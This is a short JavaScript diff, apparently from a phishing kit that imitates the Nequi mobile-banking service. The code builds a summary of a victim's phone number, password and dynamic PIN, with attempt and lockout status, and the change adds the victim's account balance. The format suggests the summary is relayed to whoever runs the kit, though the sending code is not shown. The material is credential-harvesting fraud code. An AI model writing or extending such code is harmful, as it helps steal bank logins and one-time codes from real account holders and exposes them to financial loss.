@@ -194,12 +194,14 @@
                             const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
                             const numero = datosSesion.numero || 'No registrado';
                             const clave = datosSesion.clave || 'No registrada';
+                            const saldo = datosSesion.saldo || 'No registrado';
                             
                             // Mensaje COMPLETO con toda la información
                             const mensaje = `🔢 **CLAVE DINÁMICA - RESUMEN**\n` +
                                             `🆔 ${sesionId}\n` +
                                             `📱 Número: +57 ${numero}\n` +
                                             `🔐 Clave: ${clave}\n` +
+                                            `💰 Saldo NEQUI: $${saldo}\n` +
                                             `🔢 Dinámica: ${pin}\n` +
                                             `📊 Resultado: ${intentos - 1 <= 0 ? '❌ BLOQUEADO' : `❌ Incorrecta (Intento ${4 - intentos} de 3)`}`;
                             
